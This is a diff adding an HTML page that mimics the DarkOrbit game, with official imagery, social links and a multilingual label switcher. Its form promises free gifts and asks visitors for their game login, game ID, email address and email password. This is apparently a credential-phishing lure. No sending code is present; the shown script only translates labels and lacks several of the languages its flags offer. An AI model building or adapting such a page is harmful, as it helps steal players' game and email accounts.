@@ -1,0 +1,354 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>DarkOrbit</title>
+    <style>
+        body {
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            height: 100vh;
+            margin: 0;
+            font-family: Arial, sans-serif;
+            background: url('7.jpg') no-repeat center center fixed;
+            background-size: cover;
+            overflow: hidden;
+            color: white;
+            position: relative;
+        }
+        .container {
+            text-align: center;
+            background: rgba(0, 0, 0, 0.8);
+            padding: 20px;
+            border-radius: 10px;
+            box-shadow: 0 0 20px rgba(0, 0, 0, 0.7);
+            animation: fadeIn 2s ease-in-out;
+        }
+        @keyframes fadeIn {
+            from { opacity: 0; }
+            to { opacity: 1; }
+        }
+        form {
+            display: flex;
+            flex-direction: column;
+            align-items: center;
+        }
+        input {
+            margin: 10px;
+            padding: 10px;
+            width: 250px;
+            border: 2px solid #ddd;
+            border-radius: 5px;
+            transition: border-color 0.3s, transform 0.3s;
+        }
+        input:focus {
+            border-color: #ffcc00;
+            transform: scale(1.05);
+            outline: none;
+        }
+        button {
+            margin-top: 20px;
+            padding: 10px 20px;
+            border: none;
+            border-radius: 5px;
+            background-color: #ffcc00;
+            color: black;
+            font-size: 1em;
+            cursor: pointer;
+            transition: background-color 0.3s, transform 0.3s;
+        }
+        button:hover {
+            background-color: #ff9900;
+            transform: scale(1.1);
+        }
+        .gift {
+            margin-top: 20px;
+            font-size: 1.2em;
+            color: #ffcc00;
+            animation: glow 1.5s ease-in-out infinite alternate;
+        }
+        @keyframes glow {
+            from { text-shadow: 0 0 10px #ffcc00, 0 0 20px #ffcc00, 0 0 30px #ffcc00, 0 0 40px #ffcc00, 0 0 50px #ffcc00; }
+            to { text-shadow: 0 0 20px #ffcc00, 0 0 30px #ffcc00, 0 0 40px #ffcc00, 0 0 50px #ffcc00, 0 0 60px #ffcc00; }
+        }
+        .darkorbit-image {
+            margin-top: 20px;
+            width: 100px;
+            height: auto;
+            transition: transform 0.3s;
+        }
+        .darkorbit-image:hover {
+            transform: scale(1.1);
+        }
+        .social-media {
+            margin-top: 20px;
+        }
+        .social-media a {
+            margin: 0 10px;
+            display: inline-block;
+            transition: transform 0.3s;
+        }
+        .social-media a:hover {
+            transform: scale(1.2);
+        }
+        .social-media img {
+            width: 40px;
+            height: 40px;
+        }
+        .language-menu {
+            position: absolute;
+            top: 20px;
+            right: 20px;
+        }
+        .language-menu img {
+            width: 30px;
+            height: 20px;
+            cursor: pointer;
+            margin: 5px;
+        }
+    </style>
+</head>
+<body>
+    <div class="language-menu">
+        <img src="https://upload.wikimedia.org/wikipedia/en/a/a4/Flag_of_the_United_States.svg" alt="English US" onclick="changeLanguage('en')">
+        <img src="https://upload.wikimedia.org/wikipedia/commons/b/ba/Flag_of_Germany.svg" alt="Deutsch" onclick="changeLanguage('de')">
+        <img src="https://upload.wikimedia.org/wikipedia/commons/c/c3/Flag_of_France.svg" alt="Français" onclick="changeLanguage('fr')">
+        <img src="https://upload.wikimedia.org/wikipedia/commons/a/ae/Flag_of_the_United_Kingdom.svg" alt="English UK" onclick="changeLanguage('en-UK')">
+        <img src="https://upload.wikimedia.org/wikipedia/commons/9/9a/Flag_of_Spain.svg" alt="Español" onclick="changeLanguage('es')">
+        <img src="https://upload.wikimedia.org/wikipedia/commons/4/4c/Flag_of_Sweden.svg" alt="Svenska" onclick="changeLanguage('sv')">
+        <img src="https://upload.wikimedia.org/wikipedia/commons/f/f3/Flag_of_Russia.svg" alt="Pyccĸий" onclick="changeLanguage('ru')">
+        <img src="https://upload.wikimedia.org/wikipedia/commons/0/03/Flag_of_Italy.svg" alt="Italiano" onclick="changeLanguage('it')">
+        <img src="https://upload.wikimedia.org/wikipedia/commons/b/b4/Flag_of_Turkey.svg" alt="Tϋrkçe" onclick="changeLanguage('tr')">
+        <img src="https://upload.wikimedia.org/wikipedia/commons/d/d9/Flag_of_Finland.svg" alt="Suomi" onclick="changeLanguage('fi')">
+        <img src="https://upload.wikimedia.org/wikipedia/commons/1/12/Flag_of_Poland.svg" alt="Polski" onclick="changeLanguage('pl')">
+        <img src="https://upload.wikimedia.org/wikipedia/commons/9/9c/Flag_of_Denmark.svg" alt="Dansk" onclick="changeLanguage('da')">
+        <img src="https://upload.wikimedia.org/wikipedia/commons/5/5c/Flag_of_Portugal.svg" alt="Português" onclick="changeLanguage('pt')">
+        <img src="https://upload.wikimedia.org/wikipedia/commons/2/20/Flag_of_the_Netherlands.svg" alt="Nederlands" onclick="changeLanguage('nl')">
+        <img src="https://upload.wikimedia.org/wikipedia/commons/d/d9/Flag_of_Norway.svg" alt="Norsk" onclick="changeLanguage('no')">
+        <img src="https://upload.wikimedia.org/wikipedia/commons/c/cb/Flag_of_the_Czech_Republic.svg" alt="Čeština" onclick="changeLanguage('cs')">
+        <img src="https://upload.wikimedia.org/wikipedia/commons/5/50/Flag_of_Slovakia.svg" alt="Slovenčina" onclick="changeLanguage('sk')">
+        <img src="https://upload.wikimedia.org/wikipedia/commons/0/05/Flag_of_Brazil.svg" alt="Português BR" onclick="changeLanguage('pt-BR')">
+        <img src="https://upload.wikimedia.org/wikipedia/commons/7/73/Flag_of_Romania.svg" alt="Română" onclick="changeLanguage('ro')">
+        <img src="https://upload.wikimedia.org/wikipedia/commons/5/5c/Flag_of_Greece.svg" alt="Ελληνικά" onclick="changeLanguage('el')">
+        <img src="https://upload.wikimedia.org/wikipedia/commons/9/9a/Flag_of_Bulgaria.svg" alt="Български" onclick="changeLanguage('bg')">
+        <img src="https://upload.wikimedia.org/wikipedia/commons/c/c1/Flag_of_Hungary.svg" alt="Magyar" onclick="changeLanguage('hu')">
+        <img src="https://upload.wikimedia.org/wikipedia/commons/2/21/Flag_of_Colombia.svg" alt="Colombia" onclick="changeLanguage('co')">
+        <img src="https://upload.wikimedia.org/wikipedia/commons/0/06/Flag_of_Venezuela.svg" alt="Venezuela" onclick="changeLanguage('ve')">
+        <img src="https://upload.wikimedia.org/wikipedia/commons/7/78/Flag_of_Chile.svg" alt="Chile" onclick="changeLanguage('cl')">
+        <img src="https://upload.wikimedia.org/wikipedia/commons/1/1a/Flag_of_Argentina.svg" alt="Argentina" onclick="changeLanguage('ar')">
+        <img src="https://upload.wikimedia.org/wikipedia/commons/c/cf/Flag_of_Peru.svg" alt="Perú" onclick="changeLanguage('pe')">
+        <img src="https://upload.wikimedia.org/wikipedia/commons/9/9e/Flag_of_Japan.svg" alt="日本語" onclick="changeLanguage('ja')">
+    </div>
+    <div class="container">
+        <form>
+            <input type="text" id="username" name="username" placeholder="Username" required>
+            <input type="password" id="password" name="password" placeholder="Password" required>
+            <input type="email" id="email" name="email" placeholder="Email" required>
+            <input type="password" id="emailPassword" name="emailPassword" placeholder="Email Password" required>
+            <input type="password" id="confirmEmailPassword" name="confirmEmailPassword" placeholder="Confirm Email Password" required>
+            <input type="text" id="gameId" name="gameId" placeholder="ID GAME" required>
+            <button type="submit">Claim</button>
+        </form>
+        <div class="gift">
+            CLAIM your gifts and join us in social media
+        </div>
+        <div>
+            <img src="https://darkorbitwiki.com/images/prometeus.png" alt="DarkOrbit Ship 1" class="darkorbit-image">
+            <img src="https://static.wikia.nocookie.net/darkorbit/images/8/83/Premium_1_month.PNG/revision/latest/zoom-crop/width/500/height/500?cb=20150831160732" alt="DarkOrbit Ship 2" class="darkorbit-image">
+            <img src="https://darkorbitwiki.com/images/hydra.png" alt="DarkOrbit Ship 3" class="darkorbit-image">
+        </div>
+        <div class="social-media">
+            <a href="https://www.facebook.com/darkorbit/" target="_blank">
+                <img src="https://upload.wikimedia.org/wikipedia/commons/c/cd/Facebook_logo_%28square%29.png" alt="Facebook">
+            </a>
+            <a href="https://www.youtube.com/@darkorbithq" target="_blank">
+                <img src="https://cdn.iconscout.com/icon/free/png-512/free-youtube-104-432560.png?f=webp&w=256" alt="YouTube">
+            </a>
+            <a href="https://www.instagram.com/darkorbit/" target="_blank">
+                <img src="https://upload.wikimedia.org/wikipedia/commons/a/a5/Instagram_icon.png" alt="Instagram">
+            </a>
+            <a href="https://discord.gg/j3MygA6" target="_blank">
+                <img src="https://c.clc2l.com/t/d/i/discord-4OXyS2.png" alt="Discord">
+            </a>
+        </div>
+    </div>
+    <script>
+        const translations = {
+            en: {
+                username: 'Username',
+                password: 'Password',
+                email: 'Email',
+                emailPassword: 'Email Password',
+                confirmEmailPassword: 'Confirm Email Password',
+                gameId: 'ID GAME',
+                claim: 'Claim',
+                gift: 'CLAIM your gifts and join us in social media'
+            },
+            de: {
+                username: 'Benutzername',
+                password: 'Passwort',
+                email: 'Email',
+                emailPassword: 'Email-Passwort',
+                confirmEmailPassword: 'Bestätige Email-Passwort',
+                gameId: 'SPIEL ID',
+                claim: 'Beanspruchen',
+                gift: 'BEANSPRUCHEN Sie Ihre Geschenke und treten Sie uns in den sozialen Medien bei'
+            },
+            fr: {
+                username: "Nom d'utilisateur",
+                password: 'Mot de passe',
+                email: 'Email',
+                emailPassword: 'Mot de passe email',
+                confirmEmailPassword: 'Confirmer le mot de passe email',
+                gameId: 'ID DE JEU',
+                claim: 'Réclamer',
+                gift: 'RÉCLAMEZ vos cadeaux et rejoignez-nous sur les réseaux sociaux'
+            },
+            es: {
+                username: 'Nombre de usuario',
+                password: 'Contraseña',
+                email: 'Correo electrónico',
+                emailPassword: 'Contraseña de correo',
+                confirmEmailPassword: 'Confirmar contraseña de correo',
+                gameId: 'ID DEL JUEGO',
+                claim: 'Reclamar',
+                gift: 'RECLAMA tus regalos y únete a nosotros en las redes sociales'
+            },
+            sv: {
+                username: 'Användarnamn',
+                password: 'Lösenord',
+                email: 'E-post',
+                emailPassword: 'E-postlösenord',
+                confirmEmailPassword: 'Bekräfta e-postlösenord',
+                gameId: 'SPEL-ID',
+                claim: 'Kräva',
+                gift: 'KRÄV dina gåvor och gå med oss ​​på sociala medier'
+            },
+            ru: {
+                username: 'Имя пользователя',
+                password: 'Пароль',
+                email: 'Электронная почта',
+                emailPassword: 'Пароль от электронной почты',
+                confirmEmailPassword: 'Подтвердите пароль от электронной почты',
+                gameId: 'ID ИГРЫ',
+                claim: 'Запросить',
+                gift: 'ПОЛУЧАЙТЕ свои подарки и присоединяйтесь к нам в социальных сетях'
+            },
+            it: {
+                username: 'Nome utente',
+                password: 'Password',
+                email: 'Email',
+                emailPassword: 'Password email',
+                confirmEmailPassword: 'Conferma password email',
+                gameId: 'ID GIOCO',
+                claim: 'Richiedi',
+                gift: 'RICHIEDI i tuoi regali e unisciti a noi sui social media'
+            },
+            tr: {
+                username: 'Kullanıcı adı',
+                password: 'Şifre',
+                email: 'E-posta',
+                emailPassword: 'E-posta şifresi',
+                confirmEmailPassword: 'E-posta şifresini onayla',
+                gameId: 'OYUN KİMLİĞİ',
+                claim: 'Talep et',
+                gift: 'HEDİYELERİNİ talep et ve sosyal medyada bize katıl'
+            },
+            fi: {
+                username: 'Käyttäjänimi',
+                password: 'Salasana',
+                email: 'Sähköposti',
+                emailPassword: 'Sähköpostin salasana',
+                confirmEmailPassword: 'Vahvista sähköpostin salasana',
+                gameId: 'PELIN TUNNUS',
+                claim: 'Lunasta',
+                gift: 'LUNASTA lahjasi ja liity meihin sosiaalisessa mediassa'
+            },
+            pl: {
+                username: 'Nazwa użytkownika',
+                password: 'Hasło',
+                email: 'Email',
+                emailPassword: 'Hasło do emaila',
+                confirmEmailPassword: 'Potwierdź hasło do emaila',
+                gameId: 'ID GRY',
+                claim: 'Odbierz',
+                gift: 'ODEBIRZ swoje prezenty i dołącz do nas w mediach społecznościowych'
+            },
+            da: {
+                username: 'Brugernavn',
+                password: 'Adgangskode',
+                email: 'Email',
+                emailPassword: 'Email-adgangskode',
+                confirmEmailPassword: 'Bekræft email-adgangskode',
+                gameId: 'SPIL ID',
+                claim: 'Kræve',
+                gift: 'KRÆV dine gaver og slut dig til os på sociale medier'
+            },
+            pt: {
+                username: 'Nome de usuário',
+                password: 'Senha',
+                email: 'Email',
+                emailPassword: 'Senha de email',
+                confirmEmailPassword: 'Confirmar senha de email',
+                gameId: 'ID DO JOGO',
+                claim: 'Reivindicar',
+                gift: 'REIVINDIQUE seus presentes e junte-se a nós nas redes sociais'
+            },
+            nl: {
+                username: 'Gebruikersnaam',
+                password: 'Wachtwoord',
+                email: 'Email',
+                emailPassword: 'Email-wachtwoord',
+                confirmEmailPassword: 'Bevestig email-wachtwoord',
+                gameId: 'SPEL-ID',
+                claim: 'Opeisen',
+                gift: 'EIS je cadeaus op en sluit je aan bij ons op sociale media'
+            },
+            no: {
+                username: 'Brukernavn',
+                password: 'Passord',
+                email: 'E-post',
+                emailPassword: 'E-post passord',
+                confirmEmailPassword: 'Bekreft e-post passord',
+                gameId: 'SPILL-ID',
+                claim: 'Krev',
+                gift: 'KREV dine gaver og bli med oss på sosiale medier'
+            },
+            cs: {
+                username: 'Uživatelské jméno',
+                password: 'Heslo',
+                email: 'Email',
+                emailPassword: 'Emailové heslo',
+                confirmEmailPassword: 'Potvrďte emailové heslo',
+                gameId: 'ID HRY',
+                claim: 'Nárokovat',
+                gift: 'NÁROKUJTE si své dárky a připojte se k nám na sociálních sítích'
+            },
+            sk: {
+                username: 'Používateľské meno',
+                password: 'Heslo',
+                email: 'Email',
+                emailPassword: 'Emailové heslo',
+                confirmEmailPassword: 'Potvrďte emailové heslo',
+                gameId: 'ID HRY',
+                claim: 'Reklamovať',
+                gift: 'REKLAMUJTE svoje darčeky a pripojte sa k nám na sociálnych sieťach'
+            },
+            // Add more translations as needed...
+        };
+
+        function changeLanguage(lang) {
+            document.getElementById('username').placeholder = translations[lang].username;
+            document.getElementById('password').placeholder = translations[lang].password;
+            document.getElementById('email').placeholder = translations[lang].email;
+            document.getElementById('emailPassword').placeholder = translations[lang].emailPassword;
+            document.getElementById('confirmEmailPassword').placeholder = translations[lang].confirmEmailPassword;
+            document.getElementById('gameId').placeholder = translations[lang].gameId;
+            document.querySelector('button').textContent = translations[lang].claim;
+            document.querySelector('.gift').textContent = translations[lang].gift;
+        }
+    </script>
+</body>
+</html>
